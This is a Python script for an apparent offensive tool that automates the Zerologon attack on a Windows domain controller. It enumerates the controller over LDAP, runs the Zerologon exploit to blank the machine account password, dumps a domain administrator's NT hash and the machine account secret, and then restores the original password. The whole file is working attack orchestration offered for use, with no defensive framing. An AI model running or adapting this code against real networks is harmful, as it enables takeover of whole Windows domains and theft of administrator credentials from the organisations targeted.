import sys
import argparse

from binascii import unhexlify

from impacket.ldap import ldap
from impacket.examples.utils import parse_target

from lib.exploit import zerologon
from lib.ldap_ntlmInfo import LDAPInfo
from lib.secretsdump_nano import dump
from lib.restorepassword import ChangeMachinePassword

class wrapper():
    def __init__(self, username=None, target=None, domain=None, kdcHost=None, ldaps=False):
        self.dcName = username
        self.domain = domain
        self.dc_ip = target
        self.kdcHost = kdcHost
        self.ldaps = ldaps
        self.baseDN = ""

    def pwn(self):
        if not (self.dcName or self.domain):
            ldapinfo = LDAPInfo(self.dc_ip, self.ldaps)
            result = ldapinfo.ldapinfo()
            if result:
                self.dcName = f'{result["hostname"]}$'
                self.domain = result["domain"]
                print(f"[*] LDAP enumerate result: hostname: {self.dcName}, domain: {self.domain}")
            else:
                print("[-] Failed to get target ntlm info with ldap service, please provide it manually.")
                return
        
        # Create baseDN
        for i in self.domain.split("."):
            self.baseDN += f"dc={i},"
        # Remove last ","
        self.baseDN = self.baseDN[:-1]

        # Check if target has been attack before, if can auth with none password, then skip zerologon exploit
        try:
            print(f"[*] Try to auth ldap use user: {self.dcName} with none password (if target has been pwned before)")
            ldapConnection = ldap.LDAPConnection(f'{"ldap" if not self.ldaps else "ldaps"}://{self.domain}', self.baseDN, self.kdcHost)
            ldapConnection.login(self.dcName, "", self.domain, "", "")
        except ldap.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                print('[-] Target need ldaps, please try with "-ssl"')
                sys.exit(0)
            else:
                # Zerologon exploit
                print("[*] Auth failed, start attacking.")
                exploit = zerologon(self.dc_ip, self.dcName)
                exploit.perform_attack()
        else:
            print("[+] Successful authentication with none password!")
        
        # Dump first domain admin nthash
        secretsdump = dump(dc_ip=self.dc_ip, dcName=self.dcName, domain=self.domain, baseDN=self.baseDN, kdcHost=self.kdcHost, ldaps=self.ldaps)
        username, nthash = secretsdump.NTDSDump_BlankPass()
        
        # Get Machine account hexpass
        hexpass = secretsdump.LSADump(username, nthash)

        # Restore machine account password
        action = ChangeMachinePassword(self.dc_ip, self.dcName, unhexlify(hexpass.strip("\r\n")))
        action.changePassword()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description="Zerologon with restore DC password automatically.")
    parser.add_argument("target", action="store", help="[[domain/]username[:password]@]<targetName or address>")
    parser.add_argument("-dc-ip", metavar="ip address", action="store", help="IP Address of the domain controller. If ommited it use the ip part specified in the target parameter")
    parser.add_argument("-ssl", action="store_true", help="Enable LDAPS")

    options = parser.parse_args()

    domain, username, _, address = parse_target(options.target)

    kdcHost = options.dc_ip if options.dc_ip else address

    executer = wrapper(username, address, domain, kdcHost, options.ssl)
    executer.pwn()